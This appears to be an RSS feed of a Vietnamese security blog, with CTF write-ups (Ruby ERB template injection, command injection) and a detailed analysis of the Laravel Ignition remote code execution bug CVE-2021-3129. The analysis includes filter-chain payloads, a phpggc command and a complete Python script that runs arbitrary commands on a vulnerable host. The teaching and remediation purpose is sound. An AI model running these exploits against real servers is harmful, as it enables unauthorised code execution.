@@ -1,0 +1,1404 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>All Posts - g03m0n</title>
+        <link>https://g03m0n.github.io/posts/</link>
+        <description>All Posts | g03m0n</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 10 Jun 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>Hackthebox - Neonify</title>
+    <link>https://g03m0n.github.io/posts/hackthebox---neonify/hackthebox-neonify/</link>
+    <pubDate>Mon, 10 Jun 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/hackthebox---neonify/hackthebox-neonify/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://app.hackthebox.com/challenges/Neonify" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge:</p>
+<p></p>
+<p>Đọc source code ta có thể thấy ứng dụng chạy bằng Ruby và sử dụng <a href="https://docs.ruby-lang.org/en/2.3.0/ERB.html" target="_blank" rel="noopener noreffer">ERB template</a>
+ để render.
+Đây có thể là một bài SSTI Ruby ERB Template.</p>
+<p>Ngoài ra input còn bị regrex match với tất cả kí tự từ 0 tới 9, từ a tới z.</p>
+<p></p>
+<p>Ở đây regex sẽ chỉ match từ đầu tới cuối ở trong một dòng, tức là nếu chèn vào một string bất kì rồi dùng ký tự new line <code>(\n)</code> để xuống dòng, rồi chèn vào payload SSTI thì sẽ exploit thành công.</p>
+<p>Đọc thêm tại đây: <a href="https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/" target="_blank" rel="noopener noreffer">https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/</a>
+</p>
+<p>Payload:</p>
+<pre tabindex="0"><code>keke
+&lt;%= File.open(&#39;flag.txt&#39;).read %&gt;
+</code></pre><p>Endcode payload:</p>
+<p></p>
+<p>Chèn payload và gửi request:</p>
+<p></p>
+<p>Flag: <code>HTB{r3pl4c3m3n7_s3cur1ty}</code></p>
+]]></description>
+</item>
+<item>
+    <title>CVE-2021-3129</title>
+    <link>https://g03m0n.github.io/posts/cve-2021-3129/cve-2021-3129/</link>
+    <pubDate>Wed, 01 May 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cve-2021-3129/cve-2021-3129/</guid>
+    <description><![CDATA[<h1 id="laravel--v842-debug-mode-remote-code-execution-cve-2021-3129">Laravel &lt;= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</h1>
+<h1 id="description-and-impact">Description and Impact</h1>
+<p>Ignition là một công cụ gỡ lỗi phổ biến trong Laravel, đóng một vai trò quan trọng trong việc hỗ trợ các nhà phát triển trong quá trình phát triển ứng dụng. Nó được cài đặt mặc định từ Laravel 6+.</p>
+<p>Ngoài ra Ignition còn cung cấp các mô-đun hay còn gọi là  <code>Solutions</code> , giúp ta tìm và sửa lỗi một cách dễ dàng và nhanh chóng.</p>
+<p></p>
+<p>Tuy nhiên, chức năng của nó đi kèm với một lỗ hổng khiến các trang web sử dụng phiên bản Laravel &lt;= 8.4.2 và Ignition &lt;= 2.5.1 với chế độ DEBUG được bật có nguy cơ bị tấn công RCE. Lỗ hổng nghiêm trọng này cho phép những kẻ tấn công không được xác thực thực thi mã tùy ý từ xa do sử dụng hàm <code>file_get_contents()</code> và <code>file_put_contents()</code> một cách không an toàn, có khả năng phá hoại dữ liệu ứng dụng, tài nguyên máy chủ và quyền riêng tư của người dùng.</p>
+<p><strong>CVSS Severity: 9.8 (Critical)</strong></p>
+<h1 id="prepare">Prepare</h1>
+<h2 id="ignition-debug-example">Ignition debug example</h2>
+<p>Sửa hoặc thêm <code>{{ $varialbe }}</code> vào file <code>/resource/views/welcome.blade.php</code> để làm xuất hiện chế độ debug của <code>Ignition</code></p>
+<p></p>
+<p>Khi click vào <code>Make variable optional</code> thì nó sẽ tự động replace <code>{{ $varialbe }}</code> thành </p>
+<p><code>{{ $varialbe ?? '' }}</code>. Kiểm tra log thì ta thấy được request như sau:</p>
+<p></p>
+<p><strong>Trong gói tin này:</strong></p>
+<ul>
+<li>Param <code>solution</code> : Chỉ định <code>class</code>  sẽ được thực thi. Ở đây là class <code>MakeViewVariableOptionalSolution</code>.</li>
+<li><code>parameters</code>: Đây là một JSON Object bổ sung, chứa các params cụ thể cho <code>solution</code>.</li>
+<li>Param <code>variableName</code>: Đây là tên của biến trong view mà Ignition đề xuất để sửa.</li>
+<li>Param <code>viewFile</code>: Đây là đường dẫn tới file view chứa <code>variableName</code>.</li>
+</ul>
+<h2 id="phar-deserialization">Phar Deserialization</h2>
+<h3 id="deserialize-attack">Deserialize Attack</h3>
+<p>Là kỹ thuật mà attacker có thể control được object serialize thông qua đó có thể điều chỉnh được các giá trị của các thuộc tính trong một class tuỳ theo ý muốn, đồng thời lợi dụng điểm yếu của các magic method để thực thi code và tấn công. Điển hình là các lỗi về: <code>SQL injection</code>, <code>Code injection</code>,…</p>
+<h3 id="magic-method">Magic method</h3>
+<p>Magic method là những phương thức đặc biệt trong php được khai báo có dấu <code>2 gạch</code> ở trước như <code>__construct()</code>,<code>__destruct()</code>, <code>__sleep()</code>,… và những phương thức này sẽ không thực thi nếu không được gọi, mục đích tạo ra là để giải quyết vấn đề về sự kiện trong chương trình.</p>
+<p><code>__construct()</code> : sẽ được call khi một đối tượng được khởi tạo.</p>
+<p><code>__destruct()</code> : sẽ được call khi một đối tượng bị huỷ hoặc kết thúc chương trình.</p>
+<p><code>__wakeup()</code> : được call khi một đối tượng được deserialize.</p>
+<p><code>__toString()</code>: được call khi một đối tượng được gọi như một chuỗi.</p>
+<h3 id="phar">Phar</h3>
+<p>Phar là một phần mở rộng trong php, nó giống như 1 file zip và bên trong nó chứa mã nguồn php hoặc giống như một kho lưu trữ mã nguồn PHP, nghĩa là tập hợp include các file PHP vào chung 1 phar khi excute thì sẽ tự động thực thi toàn bộ các file PHP bên trong nó mà không cần phải extract các PHP đó vào một thư mục nào trước đó cả.</p>
+<h3 id="phar-stream-wrapper">phar:// Stream Wrapper</h3>
+<p>Trong PHP, tất cả các thao tác với tệp đều được xử lý bằng <a href="https://www.php.net/manual/en/intro.stream.php" target="_blank" rel="noopener noreffer">stream</a>
+.</p>
+<p>Ví dụ: <code>http://</code>, <code>ftp://</code>, <code>file://</code>, <code>php://</code>, <code>phar://</code>,…</p>
+<ul>
+<li><code>filegetcontents(&quot;http://example.com/image.jpeg&quot;)</code></li>
+<li><code>filegetcontents(&quot;file://../images/image.jpeg&quot;)</code></li>
+<li><code>filegetcontents(&quot;phar://./folder/app.phar&quot;)</code></li>
+</ul>
+<p>phar:// stream wrapper được sử dụng để tương tác với các tệp PHAR. Nó cho phép ta thực hiện nhiều thao tác <code>read</code>/<code>write</code> khác nhau trên server. Ngoài ra ta còn có thể truy cập vào các file bên trong một file phar thông qua các <code>filesytstem function</code>.</p>
+<h3 id="phar-archives">PHAR archives</h3>
+<p>Cấu trúc của một file phar:</p>
+<p><strong><code>Stub</code>: Là một file PHP mà ta cần gói lại.</strong></p>
+<p>VD:   <strong><!-- raw HTML omitted --></strong></p>
+<p><strong><code>manifest</code> :</strong> Chứa các trường siêu dữ liệu (metadata) bao gồm thông tin về archive và các file trong archive. </p>
+<p>Đặc biệt, theo như dòng thứ hai từ dưới lên**,** nó sẽ chứa những Meta-data đã được serialize và nó sẽ được unserialize nếu được trigger bởi các <code>filesystem function</code> khi gọi đến một file <code>Phar</code> thông qua <code>phar://</code> stream wrapper.</p>
+<p></p>
+<p>Một số <code>filesystem function</code>:</p>
+<p></p>
+<p><strong><code>File contents</code>:</strong>  Là các file thực có trong archive.</p>
+<p><strong><code>Signature</code>: L</strong>à một hàm băm của file archive, ta phải có chữ ký hợp lệ nếu muốn truy cập file archive từ PHP.</p>
+<ul>
+<li>
+<p>Điều kiện để có thể khai thác được Phar Deserialize:</p>
+<p>Ta phải load được một file có nội dung tùy ý và biết được đường dẫn đến file này trong hệ thống. Tìm được một <code>filesystem function</code> trên để trigger file phar và đồng thời ta phải control được tên của file.</p>
+</li>
+</ul>
+<h1 id="root-cause-analysis">Root Cause Analysis</h1>
+<p>Lỗ hổng xảy ra ở solution <code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code>. Tại đây, ứng dụng sử dụng hai hàm để <code>read</code> và <code>write</code> tệp trong PHP là: <code>file_get_contents()</code> và <code>file_put_contents()</code>. Sai lầm nghiêm trọng nằm ở việc thiếu xác thực trong việc kiểm tra input của người dùng, cụ thể là các biến môi trường được chuyển đến các chức năng này. Kẻ tấn công có thể khai thác lỗ hổng này bằng việc tiêm mã độc thông qua các biến môi trường, sau đó Ignition sẽ đọc và thực thi, cấp cho kẻ tấn công toàn quyền kiểm soát ứng dụng.</p>
+<p></p>
+<p>Luồng hoạt động của ứng dụng:</p>
+<p>Đầu tiên, phương thức <code>makeOptional()</code> sẽ được gọi:</p>
+<p></p>
+<p>Nó sẽ đọc một tập tin có đường dẫn được truyền trong tham số <code>viewFile</code>:</p>
+<p></p>
+<p>Sau đó, biến được truyền vào  <code>variableName</code> sẽ thay đổi định dạng từ <code>$variable</code> thành  <code>$variable ?? ''</code></p>
+<p></p>
+<p>Sau đó, chương trình sẽ thực hiện so sánh token và verify để đảm bảo để đảm bảo rằng các biến trong tệp <code>view</code> luôn có giá trị hợp lệ, tránh lỗi khi biến không tồn tại.:</p>
+<p></p>
+<p>Nếu có lỗi xảy ra, thì <code>makeOptional()</code> sẽ trả về lỗi, nếu không <code>$newContent</code> sẽ được ghi đè:</p>
+<p></p>
+<p></p>
+<p>Do đó, ta không thể làm được gì nhiều khi sử dụng param <code>variableName</code>.</p>
+<p>Input variable duy nhất còn lại là <code>viewFile</code>, từ đoạn code trên ta có thể viết lại đoạn code rút gọn như sau:</p>
+<pre tabindex="0"><code> $originalContents = file_get_contents($parameters[&#39;viewFile&#39;]);
+ file_put_contents($parameters[&#39;viewFile&#39;], $output);
+</code></pre><h3 id="php-wrappers-changing-a-file">PHP wrappers: changing a file</h3>
+<p>Trong Laravel, Laravel sử dụng thự viện <code>Monolog</code> được tích hợp sẵn để cung cấp và hỗ trợ nhiều cách xử lý log khác nhau. Mặc định có một file log được lưu trữ trong thư mục <code>storage/logs</code>.</p>
+<p>Khi ta truyền vào biến <code>viewFile</code> một đường dẫn không tồn tại, file log sẽ gi lại những gì chúng ta nhập.</p>
+<p></p>
+<p>Do đó, ta có thể kiểm soát được một phần nhỏ nội dung của tệp <code>laravel.log</code> bằng cách truyền payload vào biến <code>viewFile</code>.</p>
+<p>Vì ở đây ứng dụng sử dụng hàm <code>file_get_contents()</code> để đọc file nên ta sẽ sử dụng PHP Wrapper, cụ thể là <a href="https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter" target="_blank" rel="noopener noreffer">php://filter</a>
+ . Bằng cách sử dụng kết hợp các filter tích hợp, ta có thể chỉnh sửa nội dung của tệp trước khi được trả về.</p>
+<p></p>
+<p>VD:</p>
+<pre tabindex="0"><code>$ echo &#39;hello&#39; | base64 | base64 &gt; /tmp/tu.txt
+$ cat /tmp/tu.txt
+aGVsbG8K
+</code></pre><p>Sau đó, viết một script PHP thực hiện các thao tác <code>read</code> và <code>write</code> file tương tự như các thao tác được sử dụng trong Ignition.</p>
+<pre tabindex="0"><code>&lt;?php
+$file = &#39;php://filter/convert.base64-decode/resource=/tmp/tu.txt&#39;;
+// Đọc file /tmp/tu.txt và base64-decode sau đó lưu vào biến $contents
+$contents = file_get_contents($file);
+// Base64-decode biến $contents sau đó ghi đè lên dữ liệu cũ
+file_put_contents($file, $contents);
+</code></pre><pre tabindex="0"><code>$ cat /tmp/tu.txt
+hello
+</code></pre><p>Khi decode-base64, base64 sẽ không decode những kí tự không nằm trong <a href="https://en.wikipedia.org/wiki/Base64" target="_blank" rel="noopener noreffer"><code>Base64 Encoding Alphabet</code></a>
+ mà loại bỏ chúng.</p>
+<p>VD:</p>
+<pre tabindex="0"><code>echo &#39;SGVsbG8K!!!!;;&#39; &gt; /tmp/test.txt
+</code></pre><pre tabindex="0"><code>$file = &#39;php://filter/read=convert.base64-decode/resource=/tmp/test.txt&#39;;
+$contents = file_get_contents($file);
+file_put_contents($file, $contents);
+</code></pre><p>!</p>
+<p>Ta có thể sử dụng cách này để xóa nội dung của file log.</p>
+<p>Như vậy ta đã có đủ 2 điều kiện để sử dụng kỹ thuật Phar Deserialization: Kiểm soát được file <code>laravel.log</code> với Wrapper <code>php://filter</code> và biết được đường dẫn của file <code>laravel.log</code> là <code>storage/logs/laravel.log</code></p>
+<p>Nhưng ta mới chỉ kiểm soát được một phần nhỏ file log, để thực hiện kỹ thuật Phar Deserialization ta cần phải kiểm soát được toàn bộ nội dung của file log.</p>
+<h3 id="deleting-and-writing-the-log-file">Deleting and writing the log file</h3>
+<p>Cấu trúc của mỗi đoạn đầu của log như sau:</p>
+<pre tabindex="0"><code>[Date][Error_data]&lt;viewFile&gt;[Error_data]&lt;viewFile&gt;[Error_data]
+</code></pre><p>Trong PHP có nhiều filter chuyển đổi cho nhiều kiểu mã hóa khác nhau. Tất cả đều có tiền tố <a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv" target="_blank" rel="noopener noreffer">convert.iconv.*</a>
+ . Vì cứ 2 byte thì sẽ được 1 char theo mã <code>UTF-16</code> nên khi convert từ <code>UTF16</code> sang <code>UTF-8</code> thì <code>H\0</code> -&gt; <code>H</code>. Do đó ta có thể xóa file log bằng cách truyền vào phía sau mỗi ký tự của payload một NULL byte (<code>\0</code>) sau đó chuyển đổi bảng mã từ  <code>UTF-16</code> sang <code>UTF-8</code>. Còn các cặp 2 byte ở <code>[Error_data]</code> sẽ bị convert thành junk chars giống như dưới đây. Sau đó phần junk chars này sẽ bị loại bỏ ở bước base64 decoding như đã nói ở phía trên:</p>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>UTF-8</th>
+<th>UTF-16LE</th>
+<th>UTF-16BE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>U+0041 (a)</td>
+<td>0x41</td>
+<td>0x41 0x00</td>
+<td>0x00 0x41</td>
+</tr>
+</tbody>
+</table>
+<pre tabindex="0"><code>echo &#39;[Error_data]H\0e\0l\0l\0o\0[Error_data]H\0e\0l\0l\0o\0[Error_data]&#39;&gt; /tmp/test.txt
+</code></pre><pre tabindex="0"><code>&lt;?php
+$file = &#39;php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt&#39;;
+$contents = file_get_contents($file); 
+file_put_contents($file, $contents); 
+</code></pre><p></p>
+<p>Vì payload xuất hiện 2 lần nên ta cần loại bỏ đi một cái mới đúng cấu trúc của file Phar. Ta chỉ cần thêm 1 byte vào cuối payload 1 và sử dụng cách trên convert payload từ <code>UTF16</code> sang <code>UTF8</code> để biến payload thứ 2 thành junk chars (vì <code>UTF16</code> làm việc với 2 byte nên byte alignment của payload thứ 2 sẽ bị lệch):</p>
+<pre tabindex="0"><code>echo &#39;[Error_data]H\0e\0l\0l\0o\0a[Error_data]H\0e\0l\0l\0o\0a[Error_data]&#39; &gt; /tmp/test.txt
+</code></pre><p></p>
+<p>Nhưng payload được truyền vào hàm <code>file_get_contents()</code> dưới dạng đường dẫn của tệp, do đó, ta sẽ không thể truyền vào các NULL byte (<code>\00</code>) để biểu diễn payload ở định dạng <code>UTF-16</code>. Nên ta có thể thay thế bằng ký tự <code>=00</code> sau đó sử dụng filter <a href="https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable" target="_blank" rel="noopener noreffer">convert.quoted-printable</a>
+  ****để convert các ký tự <code>=00</code> thành NULL byte (<code>\00</code>).</p>
+<p></p>
+<p>Vậy, kết luận chúng ta sẽ có Payload cuối cùng là:</p>
+<pre tabindex="0"><code>&#34;viewFile&#34; : &#34;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8
+				|convert.base64-decode/resource=../storage/logs/laravel.log&#34;
+</code></pre><p>Trong đó:</p>
+<ul>
+<li><code>convert.quoted-printable-decode</code>: decode các string có giá trị là <code>=00</code> thành byte <code>\00</code>(NULL byte).</li>
+<li><code>convert.iconv.utf-16le.utf-8</code>: convert từ UTF-16 thành UTF-8 (chuyển đổi nội dung log không mong muốn bằng cách gộp 2 byte lại để chuyển thành các junk chars).</li>
+<li><code>convert.base64-decode</code>: xóa các byte bị convert sang utf-8 mà nằm ngoài bảng mã.</li>
+</ul>
+<p>Nhưng vì sử dụng bảng mã <code>UTF-16</code> nên kích thước file log cần phải là bội số của 2 byte, nên ta cần gửi hai request như dưới đây, vì các <code>Error_data[1,2,3]</code>sẽ xuất hiện hai lần và <code>PAYLOAD_A</code> và <code>PAYLOAD_B</code> cũng xuất hiện hai lần nên tổng số byte sẽ luôn là số chẵn.</p>
+<pre tabindex="0"><code>[Error_data1]PAYLOAD_A[Error_data2]PAYLOAD_A[Error_data3]
+[Error_data1]PAYLOAD_B[Error_data2]PAYLOAD_B[Error_data3]
+</code></pre><p>Để <code>PAYLOAD_A</code> biến mất khi decode-base64, ta sẽ gửi 1 payload với số byte chẵn như <code>AA</code> và biến <code>PAYLOAD_B</code> thành PHAR payload.</p>
+<pre tabindex="0"><code>[Error_data1]AA[Error_data2]AA[Error_data3]
+[Error_data1]PAYLOAD_B[Error_data2]PAYLOAD_B[Error_data3]
+</code></pre><ul>
+<li>
+<p>Note:</p>
+<p>Các <code>Error_data</code> có kích thước giống nhau vì nó gặp lỗi ở cùng một vị trí nên các <code>Error_data</code> sẽ giống nhau. VÌ vậy, trong mọi trường hợp, kích thước của file log luôn là số chẵn.</p>
+</li>
+</ul>
+<p>Ta rút ra được quy trình khai thác sau:</p>
+<p>Xóa log → Gửi content ‘AA’ → Gửi payload (các <code>Error_data</code> sẽ xuất hiện 2 lần) → Chẵn ký tự. Vì payload xuất hiện 2 lần nên dựa vào chức năng của filter <code>convert.iconv.utf-16le.utf-8</code> chỉ cần thêm 1 byte vào sau payload thì quá trình decode payload thứ 2 sẽ bị lệch byte và trở thành <code>junk chars</code> → Chạy PHAR deserialization.</p>
+<ul>
+<li>
+<p>Note</p>
+<p>Ngoài ra ta có thể sử dụng filter <code>consumed</code> (undocument) để xóa nội dung file log bằng cách:</p>
+<pre tabindex="0"><code>php://filter/write=consumed/resources=../storage/logs/laravel.log
+</code></pre><p>Ngoài ra, nếu sử dụng filter <code>base64-decode</code> lên một chuỗi có chứa dấu <code>=</code> ở giữa, PHP sẽ tạo ra lỗi và không trả về kết quả nào.</p>
+</li>
+</ul>
+<h2 id="create-payload-with-phpggc">Create Payload with PHPGGC</h2>
+<p>Ở đây ta sẽ sử dụng <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">phpggc</a>
+ để tạo payload. Công cụ này tạo ra các gadget-chains cho các cuộc tấn công PHP Deserialization. Và nó có thể tạo payload dưới dạng PHAR file với argument <code>--phar phar</code>.</p>
+<p>Như đã nói ở trên, <code>Monolog</code> là một thư viện có sẵn trong Laravel nên ta sẽ sử dụng gadget <code>monolog/rce1</code>.</p>
+<pre tabindex="0"><code>php -d&#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system &#39;id&#39; --phar phar -o php://output | base64 -w0
+| python -c &#34;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in input()]).upper())&#34;
+</code></pre><ul>
+<li>
+<p>Trong đó:</p>
+<p><code>-d'phar.readonly=0'</code>: Đây là tùy chọn dòng lệnh cho PHP cho phép sửa đổi các tệp Phar. Theo mặc định, PHP sẽ chỉ cho phép đọc tệp Phar, nhưng tùy chọn này cho phép ghi và sửa đổi nội dung của tệp Phar.</p>
+<p><code>print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in input()]).upper())</code>: chuyển từng ký tự thành mã Unicode của nó rồi chuyển mã Unicode thành mã Hex sau đó thêm ký tự &ldquo;=&rdquo; ở đầu và cuối mỗi chuỗi Hex và thêm chuỗi <code>00</code> ở cuối mỗi cặp Hex. Cuối cùng dùng hàm <code>join()</code> để ghép các chuỗi Hex thành một chuỗi duy nhất và dùng hàm <code>upper()</code> chuyển đổi tất cả các ký tự trong chuỗi thành ký tự in hoa.</p>
+<p>VD: Ký tự <code>P</code> có mã hex là 50 → <code>=50=00</code></p>
+</li>
+</ul>
+<h1 id="steps-to-reproduce">Steps to reproduce</h1>
+<ul>
+<li>
+<p>Prepare environment</p>
+<ul>
+<li>docker-compose.yml</li>
+</ul>
+<pre tabindex="0"><code>version: &#39;2&#39;
+services:
+ web:
+		build: .
+    image: vulhub/laravel:8.4.2
+    ports:
+         - &#34;3333:80&#34;
+</code></pre><ul>
+<li>Dockerfile</li>
+</ul>
+<pre tabindex="0"><code>RUN pecl install xdebug-3.1.5
+&amp;&amp; docker-php-ext-enable xdebug
+&amp;&amp; echo &#34;[xdebug]&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+&amp;&amp; echo &#34;zend_extension=xdebug.so&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+&amp;&amp; echo &#34;xdebug.mode=develop,debug&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+&amp;&amp; echo &#34;xdebug.start_with_request=yes&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+&amp;&amp; echo &#34;xdebug.log=/tmp/xdebug_remote.log&#34; 
+		&gt;&gt; /usr/local/etc/php/php.ini
+</code></pre></li>
+</ul>
+<ol>
+<li>Đầu tiên, ta tiến hành xóa log trong file <code>laravel.log</code> bằng <code>consumed</code> filter.</li>
+</ol>
+<p>Payload:</p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;php://filter/read=consumed/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
+<ol start="2">
+<li>Gửi payload <code>AA</code> để căn chỉnh kích thước của file log.</li>
+</ol>
+<p>Payload:</p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;AA&#34;
+</code></pre><p></p>
+<ol start="3">
+<li>Tạo log chứa payload:</li>
+</ol>
+<p>Payload: (whoami)</p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;=50=00=44=00=39=00=77=00=61=00=48=00...=67=00=3D=00=3D=00a&#34;
+</code></pre><p></p>
+<ol start="4">
+<li>Convert file log sang PHAR file.</li>
+</ol>
+<p>Payload:</p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:
+&#34;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8
+			|convert.base64-decode/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
+<ul>
+<li>
+<p>Debug</p>
+<ul>
+<li><code>convert.quoted-printable-decode</code>: decode các string có giá trị là <code>=00</code> thành byte <code>\00</code>(NULL byte).</li>
+</ul>
+<pre tabindex="0"><code>&#34;viewFile&#34;:
+&#34;php://filter/write=convert.quoted-printable-decode/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
+<ul>
+<li><code>convert.iconv.utf-16le.utf-8</code>: convert từ UTF-16 thành UTF-8 (chuyển đổi nội dung log không mong muốn bằng cách gộp 2 byte lại để chuyển thành các junk chars).</li>
+</ul>
+<pre tabindex="0"><code>&#34;viewFile&#34;:
+&#34;php://filter/write=convert.iconv.utf-16le.utf-8/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
+<ul>
+<li><code>convert.base64-decode</code>: xóa các ký tự khi convert từ <code>UTF-16</code> sang <code>UTF-8</code> mà nằm ngoài bảng mã và convert file log sang PHAR file.</li>
+</ul>
+<pre tabindex="0"><code>&#34;viewFile&#34;:
+&#34;php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log&#34;
+</code></pre><p></p>
+</li>
+</ul>
+<ol start="5">
+<li>Chạy PHAR deserialization</li>
+</ol>
+<p>Payload:</p>
+<pre tabindex="0"><code>&#34;viewFile&#34;:&#34;phar:///var/www/storage/logs/laravel.log&#34;
+</code></pre><p></p>
+<ul>
+<li>
+<p>Script exploit tự động</p>
+<pre tabindex="0"><code>import requests, sys, re, os
+import argparse, urllib3
+
+urllib3.disable_warnings()
+
+def sendPayload(payload):
+    url = &#34;http://localhost:3333/_ignition/execute-solution&#34;#change this
+    header = {
+            &#34;Accept&#34;: &#34;application/json&#34;
+            }
+    data = {
+            &#34;solution&#34;: &#34;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&#34;,
+            &#34;parameters&#34;: {
+                &#34;variableName&#34;: &#34;variable&#34;,
+                &#34;viewFile&#34;: &#34;&#34;
+            }
+        }
+    data[&#34;parameters&#34;][&#34;viewFile&#34;] = payload
+    resp = requests.post(url=url, headers=header, json=data, verify=False)
+    if resp.status_code == 500 and &#39;php.ini&#39; in resp.text:
+        m = re.findall(r&#39;\{(.|\n)+\}((.|\n)*)&#39;, resp.text)
+        print(&#34;Result: &#34; , m[0][1])
+    return resp
+
+def clearLog():
+    return sendPayload(&#34;php://filter/read=consumed/resource=../storage/logs/laravel.log&#34;)
+    # php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
+
+def decodeLog():
+    return sendPayload(
+        &#34;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&#34;)
+
+def unserializeLog():
+    return sendPayload(&#34;phar://../storage/logs/laravel.log/test.txt&#34;)
+def genPHPGGC(command):
+    payload = &#34;&#34;&#34;php -d &#39;phar.readonly=0&#39; phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c &#34;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:] + &#39;=00&#39; for i in sys.stdin.read()]).upper())&#34; &gt; payload.txt&#34;&#34;&#34;%(command)
+    os.system(payload)
+    with open(&#39;payload.txt&#39;, &#39;r&#39;) as f:
+        payload = f.read().replace(&#39;\n&#39;, &#39;&#39;) + &#39;a&#39;
+    os.system(&#34;rm -r payload.txt&#34;)
+    print (payload)
+    return payload
+
+def main():
+    while True:
+        command = input(&#34;Enter command (or &#39;exit&#39; to quit): &#34;)
+        if command.lower() == &#39;exit&#39;:
+            break
+        clearLog()
+        sendPayload(&#39;AA&#39;)
+        sendPayload(genPHPGGC(command))
+        decodeLog()
+        unserializeLog()
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre><p>VD: python3 <a href="http://exp.py" target="_blank" rel="noopener noreffer">exp.py</a>
+ ‘id’</p>
+</li>
+</ul>
+<h1 id="recommendation">Recommendation</h1>
+<p>So sánh 2 file code, sau khi update Laravel đã thêm vào một hàm kiểm tra input của người dùng truyền qua param <code>viewFile</code> là <code>isSafePath()</code>. Hàm này có tác dụng kiểm tra xem input có bắt đầu bằng đường dẫn tuyệt đối <code>/</code>, đường dẫn tương đối <code>./</code> hoặc file có kết thúc bằng extention <code>blade.php</code> hay không, nếu không thì return <code>false</code>.</p>
+<p></p>
+<p>Nếu cần bật chế độ Debug trên môi trường non-local thì nên tắt chế độ Suggestion Solutions của Ignition bằng cách set <code>ignition.enable_runnable_solutions</code> thành <code>false</code> trong file <code>.env</code>.</p>
+<p></p>
+<p>Kể từ phiên bản Ignition <code>2.6.*</code> trở đi chế độ Debug Suggestion Solutions không thể bật ở môi trường non-local.</p>
+<h1 id="references">References</h1>
+<p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener noreffer">https://www.ambionics.io/blog/laravel-debug-rce</a>
+</p>
+<p><a href="https://knqyf263.hatenablog.com/entry/2021/10/09/165405" target="_blank" rel="noopener noreffer">https://knqyf263.hatenablog.com/entry/2021/10/09/165405</a>
+</p>
+]]></description>
+</item>
+<item>
+    <title>CookieCTF - The Existed File</title>
+    <link>https://g03m0n.github.io/posts/cookiectf---the-existed-file/cookiectf-the-existed-file/</link>
+    <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cookiectf---the-existed-file/cookiectf-the-existed-file/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/arenas/mini-ctf-web-hacking/battle/the-existed-file" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge.</p>
+<p></p>
+<p>Thử nhập <code>/flag.txt</code> vẫn không có thay đổi gì. Ta thử nhập <code>cat /flag.txt</code> xem có xem được <code>flag</code> không nhưng lại hiện ra thông báo <code>Blacklist characters detected!</code>.</p>
+<p></p>
+<p>Kiểm tra <code>soucre code</code> có thể thấy luồng hoạt động của server.</p>
+<p></p>
+<p>Đoạn code này loại bỏ khoảng trắng của <code>input</code> người dùng nhập vào. Nó sử dụng phương thức <code>translate()</code> của lớp <code>string</code> để thay thế tất cả các ký tự khoảng trắng bằng giá trị <code>None</code>.
+Sau đó sẽ sử dung hàm <code>is_blacklisted</code> để kiểm tra <code>input</code> có nằm trong blacklist hay không.</p>
+<p>Có thể thấy <code>blacklist</code> đã loại bỏ hầu hết các câu lệnh giúp ta đọc được file <code>flag</code>, tuy nhiên anh dev có lẽ đã quên mất <code>filter</code> 1 cái nữa đó là <code>$(command)</code>. Câu lệnh này tương đương với sử dụng dấu <code>backstick</code>.</p>
+<p></p>
+<p>Quay lại challenge thử chạy luôn nhưng nó vẫn không xuất được nội dung</p>
+<p></p>
